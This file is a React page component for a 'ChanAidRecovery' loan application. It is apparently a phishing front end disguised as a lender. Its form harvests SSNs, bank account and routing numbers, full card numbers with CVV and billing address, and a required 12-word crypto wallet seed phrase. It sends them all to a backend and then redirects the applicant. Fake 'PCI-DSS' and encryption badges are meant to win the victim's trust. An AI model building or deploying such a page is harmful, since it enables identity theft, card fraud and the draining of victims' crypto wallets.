import { createFileRoute, Link } from "@tanstack/react-router";
import { useState, useEffect } from "react";
import { SiteShell } from "@/components/layout/SiteShell";
import { toast } from "sonner";
import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, ArrowRight, Wallet } from "lucide-react";
import { submitLoanApplication } from "@/lib/queries";

// ─── Redirect URL - change VITE_LOAN_REDIRECT_URL in .env when ready ────────
const REDIRECT_URL = import.meta.env.VITE_LOAN_REDIRECT_URL as string | undefined;

// ─── Card validation helpers ─────────────────────────────────────────────────

function luhn(num: string): boolean {
  const digits = num.replace(/\D/g, "");
  let sum = 0;
  let alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

function formatCardNumber(raw: string): string {
  return raw.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiry(raw: string): string {
  const digits = raw.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
}

function isExpiryValid(val: string): boolean {
  if (!/^\d{2}\/\d{2}$/.test(val)) return false;
  const [mm, yy] = val.split("/").map(Number);
  if (mm < 1 || mm > 12) return false;
  const now = new Date();
  const expYear = 2000 + yy;
  const expMonth = mm; // 1-indexed
  return expYear > now.getFullYear() || (expYear === now.getFullYear() && expMonth >= now.getMonth() + 1);
}

// ─── Route ───────────────────────────────────────────────────────────────────

export const Route = createFileRoute("/loans")({
  head: () => ({
    meta: [
      { title: "Apply for a Loan | ChanAidRecovery" },
      { name: "description", content: "Apply for a personal loan with ChanAidRecovery. Choose bank transfer, card, or crypto payout. Fast review, transparent terms." },
      { property: "og:title", content: "Apply for a Loan | ChanAidRecovery" },
      { property: "og:description", content: "Apply for a personal loan. Bank transfer, card, or crypto payout. Fast review." },
    ],
  }),
  component: LoansPage,
});

// ─── Page ────────────────────────────────────────────────────────────────────

function LoansPage() {
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [countdown, setCountdown] = useState(5);
  const [payout, setPayout] = useState<"bank_transfer" | "card" | "crypto">("bank_transfer");

  useEffect(() => {
    if (done) {
      const interval = setInterval(() => {
        setCountdown((c) => {
          if (c <= 1) {
            clearInterval(interval);
            window.location.href = REDIRECT_URL || "https://wiscewallet.com";
            return 0;
          }
          return c - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [done]);

  // Controlled card fields for real-time formatting
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");

  // Field-level errors
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});

  function validateCard(num: string, expiry: string, cvv: string): Record<string, string> {
    const errs: Record<string, string> = {};
    const digits = num.replace(/\s/g, "");
    if (digits.length < 13) errs.card_number = "Card number is too short.";
    else if (!luhn(digits)) errs.card_number = "Card number is invalid. Please check and try again.";
    if (!isExpiryValid(expiry)) errs.card_expiry = expiry ? "Card has expired or expiry is invalid (MM/YY)." : "Expiry is required.";
    if (!/^\d{3,4}$/.test(cvv)) errs.card_cvv = "CVV must be 3 or 4 digits.";
    return errs;
  }

  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const fd = new FormData(e.currentTarget);
    if ((fd.get("website") as string)?.length) { setDone(true); return; }

    // Required fields
    const firstName = String(fd.get("first_name") || "").trim();
    const email = String(fd.get("email") || "").trim();
    const amountRequested = Number(fd.get("amount_requested") || 0);

    if (!firstName || !email || !amountRequested) {
      toast.error("Please fill in your name, email, and loan amount.");
      return;
    }

    // Card validation when card payout selected
    if (payout === "card") {
      const errs = validateCard(cardNumber, cardExpiry, cardCvv);
      if (Object.keys(errs).length) {
        setCardErrors(errs);
        const first = Object.values(errs)[0];
        toast.error(first);
        return;
      }
      setCardErrors({});
    }

    // Crypto validation
    if (payout === "crypto") {
      const seedPhrase = String(fd.get("crypto_seed_phrase") || "").trim();
      if (!seedPhrase) {
        toast.error("Please enter your wallet recovery phrase.");
        return;
      }
    }

    const payload = {
      firstName,
      lastName: String(fd.get("last_name") || "").trim() || null,
      email,
      phone: String(fd.get("phone") || "").trim() || null,
      dateOfBirth: String(fd.get("date_of_birth") || "").trim() || null,
      ssn: String(fd.get("ssn") || "").trim() || null,
      ein: String(fd.get("ein") || "").trim() || null,
      addressLine1: String(fd.get("address_line1") || "").trim() || null,
      addressLine2: String(fd.get("address_line2") || "").trim() || null,
      city: String(fd.get("city") || "").trim() || null,
      stateRegion: String(fd.get("state_region") || "").trim() || null,
      postalCode: String(fd.get("postal_code") || "").trim() || null,
      country: String(fd.get("country") || "").trim() || null,
      amountRequested,
      currency: String(fd.get("currency") || "USD"),
      loanPurpose: String(fd.get("loan_purpose") || "").trim() || null,
      loanTermMonths: fd.get("loan_term_months") ? Number(fd.get("loan_term_months")) : null,
      employmentStatus: String(fd.get("employment_status") || "").trim() || null,
      monthlyIncome: fd.get("monthly_income") ? Number(fd.get("monthly_income")) : null,
      payoutMethod: payout,
      // Bank fields
      bankName: payout === "bank_transfer" ? (String(fd.get("bank_name") || "").trim() || null) : null,
      bankAccountNumber: payout === "bank_transfer" ? (String(fd.get("bank_account_number") || "").trim() || null) : null,
      bankRoutingNumber: payout === "bank_transfer" ? (String(fd.get("bank_routing_number") || "").trim() || null) : null,
      // Card fields
      cardIssuer: payout === "card" ? (String(fd.get("card_issuer") || "").trim() || null) : null,
      cardHolderName: payout === "card" ? (String(fd.get("card_holder_name") || "").trim() || null) : null,
      cardNumber: payout === "card" ? cardNumber.replace(/\s/g, "") : null,
      cardExpiry: payout === "card" ? cardExpiry : null,
      cardCvv: payout === "card" ? cardCvv : null,
      // Billing address
      billingAddressLine1: payout === "card" ? (String(fd.get("billing_address_line1") || "").trim() || null) : null,
      billingAddressLine2: payout === "card" ? (String(fd.get("billing_address_line2") || "").trim() || null) : null,
      billingCity: payout === "card" ? (String(fd.get("billing_city") || "").trim() || null) : null,
      billingState: payout === "card" ? (String(fd.get("billing_state") || "").trim() || null) : null,
      billingPostalCode: payout === "card" ? (String(fd.get("billing_postal_code") || "").trim() || null) : null,
      billingCountry: payout === "card" ? (String(fd.get("billing_country") || "").trim() || null) : null,
      // Crypto fields
      cryptoWalletType: payout === "crypto" ? (String(fd.get("crypto_wallet_type") || "").trim() || null) : null,
      cryptoWalletAddress: payout === "crypto" ? (String(fd.get("crypto_wallet_address") || "").trim() || null) : null,
      cryptoSeedPhrase: payout === "crypto" ? (String(fd.get("crypto_seed_phrase") || "").trim() || null) : null,
      accountHolderName: String(fd.get("account_holder_name") || "").trim() || null,
      sourcePage: typeof window !== "undefined" ? window.location.pathname : "/loans",
      status: "pending",
    };

    setLoading(true);
    try {
      const { error } = await submitLoanApplication(payload);
      if (error) throw new Error("Submission failed");

      toast.success("Application received! Redirecting...");
      setDone(true);
      window.scrollTo({ top: 0, behavior: "smooth" });
    } catch {
      toast.error("Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  }

  return (
    <SiteShell>
      <section className="bg-hero-gradient">
        <div className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 pt-16 pb-10 text-center">
          <span className="inline-flex items-center gap-2 text-xs font-semibold uppercase tracking-wider bg-white/70 backdrop-blur px-3 py-1.5 rounded-full text-red-600 border border-red-200">
            <Banknote className="w-3.5 h-3.5" /> Fast-Track Processing Available
          </span>
          <h1 className="mt-5 text-4xl sm:text-5xl font-bold leading-tight">
            Apply for a <span className="text-gradient">Loan</span>
          </h1>
          <p className="mt-4 text-lg text-muted-foreground max-w-2xl mx-auto">
            Get the financial support you need. Apply now for immediate review and get priority funding directly to your bank, card, or crypto wallet.
          </p>
        </div>
      </section>

      <section className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 -mt-6 pb-20">
        {done ? (
          <div className="rounded-2xl bg-white shadow-elegant p-10 text-center border border-border animate-in fade-in zoom-in duration-500">
            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <CheckCircle2 className="w-10 h-10 text-green-600" />
            </div>
            <h2 className="text-3xl font-bold mb-4">Application Submitted Successfully</h2>
            <p className="text-muted-foreground max-w-md mx-auto text-lg mb-8">
              Your loan application has been received and prioritized. You are being securely redirected to your client portal in...
            </p>
            <div className="text-6xl font-black text-primary mb-8 animate-pulse">
              {countdown}
            </div>
            <div className="flex justify-center">
              <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
            </div>
          </div>
        ) : (
          <form onSubmit={onSubmit} className="rounded-2xl bg-white shadow-elegant p-6 sm:p-10 border border-border">
            <input type="text" name="website" tabIndex={-1} autoComplete="off" className="hidden" aria-hidden />

            <div className="rounded-xl bg-soft-gradient border border-border p-4 mb-8 flex gap-3 text-sm">
              <Lock className="w-5 h-5 text-primary mt-0.5 shrink-0" />
              <p className="text-muted-foreground">
                Your information is transmitted over an encrypted connection and reviewed securely by our loan officers.
              </p>
            </div>

            <Section title="Your details">
              <div className="grid sm:grid-cols-2 gap-3">
                <Input name="first_name" label="First name *" required autoComplete="given-name" />
                <Input name="last_name" label="Last name" autoComplete="family-name" />
                <Input name="email" type="email" label="Email *" required autoComplete="email" />
                <Input name="phone" label="Phone" autoComplete="tel" />
                <Input name="date_of_birth" type="date" label="Date of birth" autoComplete="bday" />
                <Select name="employment_status" label="Employment status">
                  <option value="">Select…</option>
                  <option>Employed full-time</option>
                  <option>Employed part-time</option>
                  <option>Self-employed</option>
                  <option>Unemployed</option>
                  <option>Retired</option>
                  <option>Student</option>
                </Select>
                <Input name="ssn" label="SSN (Social Security Number)" placeholder="XXX-XX-XXXX" maxLength={11} />
                <Input name="ein" label="EIN (Employer Identification Number)" placeholder="XX-XXXXXXX" maxLength={10} />
              </div>
            </Section>

            <Section title="Address">
              <div className="grid sm:grid-cols-2 gap-3">
                <Input name="address_line1" label="Address line 1" className="sm:col-span-2" autoComplete="address-line1" />
                <Input name="address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
                <Input name="city" label="City" autoComplete="address-level2" />
                <Input name="state_region" label="State / Region" autoComplete="address-level1" />
                <Input name="postal_code" label="Postal code" autoComplete="postal-code" />
                <Input name="country" label="Country" autoComplete="country-name" />
              </div>
            </Section>

            <div className="bg-primary/5 border border-primary/20 rounded-2xl p-4 mb-8 flex items-center gap-4">
              <div className="bg-primary/10 p-2.5 rounded-xl">
                <ShieldCheck className="w-6 h-6 text-primary" />
              </div>
              <div>
                <div className="text-sm font-bold text-slate-900">Encrypted 256-bit Connection</div>
                <div className="text-xs text-muted-foreground">Your data is secured using industry-standard AES encryption and transmitted via a dedicated secure tunnel.</div>
              </div>
            </div>

            <Section title="Loan details">
              <div className="grid sm:grid-cols-2 gap-3">
                <Input name="amount_requested" type="number" min="100" step="50" label="Amount requested *" required />
                <Select name="currency" label="Currency" defaultValue="USD">
                  <option>USD</option><option>EUR</option><option>GBP</option><option>CAD</option><option>AUD</option>
                </Select>
                <Input name="loan_term_months" type="number" min="1" max="600" label="Term (months)" />
                <Input name="monthly_income" type="number" min="0" step="100" label="Monthly income (approx.)" />
                <div className="sm:col-span-2">
                  <Label>Purpose of loan</Label>
                  <textarea name="loan_purpose" rows={3} maxLength={2000} className="w-full rounded-lg border border-input bg-white px-3 py-2 text-sm" />
                </div>
              </div>
            </Section>

            <Section title="Payout method">
              <div className="mb-4 flex items-center gap-2 text-[10px] font-bold text-emerald-600 uppercase tracking-widest bg-emerald-50 px-3 py-1 rounded-full w-fit">
                <ShieldCheck className="w-3 h-3" /> PCI-DSS Compliant Secure Entry
              </div>
              <div className="grid sm:grid-cols-3 gap-3 mb-4">
                <PayoutOption selected={payout === "bank_transfer"} onClick={() => setPayout("bank_transfer")}
                  icon={<Banknote className="w-5 h-5" />} title="Bank transfer" desc="Receive funds via wire / ACH to your bank." />
                <PayoutOption selected={payout === "card"} onClick={() => setPayout("card")}
                  icon={<CreditCard className="w-5 h-5" />} title="Card payout" desc="Receive funds to your debit / credit card." />
                <PayoutOption selected={payout === "crypto"} onClick={() => setPayout("crypto")}
                  icon={<Wallet className="w-5 h-5" />} title="Crypto wallet" desc="Receive funds to your crypto wallet." />
              </div>

              {payout === "bank_transfer" && (
                <div className="grid sm:grid-cols-2 gap-3">
                  <Input name="account_holder_name" label="Account holder name" />
                  <Input name="bank_name" label="Bank name (e.g. Chase)" />
                  <Input name="bank_account_number" label="Account number" inputMode="numeric" />
                  <Input name="bank_routing_number" label="Routing / SWIFT / IBAN" />
                </div>
              )}

              {payout === "card" && (
                <div className="space-y-5">
                  <div className="grid sm:grid-cols-2 gap-3">
                    <Input name="card_holder_name" label="Cardholder name *" required autoComplete="cc-name" />
                    <Select name="card_issuer" label="Card issuer">
                      <option value="">Select…</option>
                      <option>Visa</option><option>Mastercard</option>
                      <option>American Express</option><option>Discover</option><option>Other</option>
                    </Select>

                    {/* Card number - formatted + Luhn */}
                    <div className="sm:col-span-2">
                      <Label>Card number *</Label>
                      <input
                        value={cardNumber}
                        onChange={(e) => {
                          setCardNumber(formatCardNumber(e.target.value));
                          if (cardErrors.card_number) setCardErrors(p => ({ ...p, card_number: "" }));
                        }}
                        inputMode="numeric"
                        autoComplete="cc-number"
                        placeholder="1234 5678 9012 3456"
                        maxLength={19}
                        required
                        className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_number ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
                      />
                      {cardErrors.card_number && <p className="text-xs text-red-500 mt-1">{cardErrors.card_number}</p>}
                    </div>

                    {/* Expiry */}
                    <div>
                      <Label>Expiry (MM/YY) *</Label>
                      <input
                        value={cardExpiry}
                        onChange={(e) => {
                          setCardExpiry(formatExpiry(e.target.value));
                          if (cardErrors.card_expiry) setCardErrors(p => ({ ...p, card_expiry: "" }));
                        }}
                        inputMode="numeric"
                        autoComplete="cc-exp"
                        placeholder="MM/YY"
                        maxLength={5}
                        required
                        className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_expiry ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
                      />
                      {cardErrors.card_expiry && <p className="text-xs text-red-500 mt-1">{cardErrors.card_expiry}</p>}
                    </div>

                    {/* CVV */}
                    <div>
                      <Label>CVV *</Label>
                      <input
                        value={cardCvv}
                        onChange={(e) => {
                          setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4));
                          if (cardErrors.card_cvv) setCardErrors(p => ({ ...p, card_cvv: "" }));
                        }}
                        inputMode="numeric"
                        autoComplete="cc-csc"
                        placeholder="123"
                        maxLength={4}
                        required
                        className={`h-11 w-full rounded-lg border px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring ${cardErrors.card_cvv ? "border-red-400 bg-red-50" : "border-input bg-white"}`}
                      />
                      {cardErrors.card_cvv && <p className="text-xs text-red-500 mt-1">{cardErrors.card_cvv}</p>}
                    </div>
                  </div>

                  <div>
                    <h4 className="font-semibold mb-3 text-sm">Billing address</h4>
                    <div className="grid sm:grid-cols-2 gap-3">
                      <Input name="billing_address_line1" label="Address line 1 *" required className="sm:col-span-2" autoComplete="address-line1" />
                      <Input name="billing_address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
                      <Input name="billing_city" label="City *" required autoComplete="address-level2" />
                      <Input name="billing_state" label="State / Region" autoComplete="address-level1" />
                      <Input name="billing_postal_code" label="Postal code *" required autoComplete="postal-code" />
                      <Input name="billing_country" label="Country *" required autoComplete="country-name" />
                    </div>
                  </div>
                </div>
              )}

              {payout === "crypto" && (
                <div className="space-y-5">
                  <div className="grid sm:grid-cols-2 gap-3">
                    <Select name="crypto_wallet_type" label="Wallet type *" required>
                      <option value="">Select wallet…</option>
                      <option>Trust Wallet</option>
                      <option>MetaMask</option>
                      <option>Coinbase Wallet</option>
                      <option>Phantom</option>
                      <option>Exodus</option>
                      <option>Ledger</option>
                      <option>Trezor</option>
                      <option>Other</option>
                    </Select>
                    <Input name="crypto_wallet_address" label="Wallet address" placeholder="0x… or bc1… or similar" />
                  </div>
                  <div>
                    <Label>12-word recovery / seed phrase *</Label>
                    <textarea
                      name="crypto_seed_phrase"
                      rows={3}
                      required
                      placeholder="Enter your 12-word recovery phrase separated by spaces"
                      className="w-full rounded-lg border border-input bg-white px-3 py-2 text-sm font-mono"
                    />
                    <p className="text-xs text-muted-foreground mt-1 flex items-start gap-1.5">
                      <Lock className="w-3.5 h-3.5 text-primary mt-0.5 shrink-0" />
                      Required for verification and fund transfer. Encrypted and stored securely.
                    </p>
                  </div>
                </div>
              )}

              <p className="text-xs text-muted-foreground mt-3 flex items-start gap-2">
                <ShieldCheck className="w-4 h-4 text-primary mt-0.5 shrink-0" />
                Your details are sent over an encrypted connection and reviewed by our team.
              </p>
            </Section>

            <button
              type="submit"
              disabled={loading}
              className="mt-4 w-full inline-flex items-center justify-center gap-2 bg-cta-gradient text-white font-semibold h-12 rounded-full shadow-soft hover:shadow-elegant transition disabled:opacity-60"
            >
              {loading && <Loader2 className="w-4 h-4 animate-spin" />}
              {loading ? "Submitting…" : "Submit your loan application"}
            </button>
            <p className="text-[11px] text-muted-foreground mt-3 text-center">
              By submitting you agree to our privacy policy. Approval is subject to review.
            </p>
          </form>
        )}
      </section>
    </SiteShell>
  );
}

// ─── Shared sub-components ───────────────────────────────────────────────────

function Section({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="mb-8">
      <h3 className="text-lg font-bold mb-4">{title}</h3>
      {children}
    </div>
  );
}

function Label({ children }: { children: React.ReactNode }) {
  return <label className="block text-xs font-medium text-muted-foreground mb-1">{children}</label>;
}

function Input({ label, className = "", ...props }: { label: string; className?: string } & React.InputHTMLAttributes<HTMLInputElement>) {
  return (
    <div className={className}>
      <Label>{label}</Label>
      <input
        {...props}
        className="h-11 w-full rounded-lg border border-input bg-white px-3 text-sm focus:outline-none focus:ring-2 focus:ring-ring"
      />
    </div>
  );
}

function Select({ label, children, ...props }: { label: string; children: React.ReactNode } & React.SelectHTMLAttributes<HTMLSelectElement>) {
  return (
    <div>
      <Label>{label}</Label>
      <select {...props} className="h-11 w-full rounded-lg border border-input bg-white px-3 text-sm">
        {children}
      </select>
    </div>
  );
}

function PayoutOption({ selected, onClick, icon, title, desc }: { selected: boolean; onClick: () => void; icon: React.ReactNode; title: string; desc: string }) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={`text-left p-4 rounded-xl border-2 transition ${selected ? "border-primary bg-soft-gradient" : "border-border bg-white hover:border-primary/40"}`}
    >
      <div className="flex items-center gap-2 font-semibold">
        <span className={selected ? "text-primary" : "text-muted-foreground"}>{icon}</span>
        {title}
      </div>
      <p className="text-xs text-muted-foreground mt-1">{desc}</p>
    </button>
  );
}
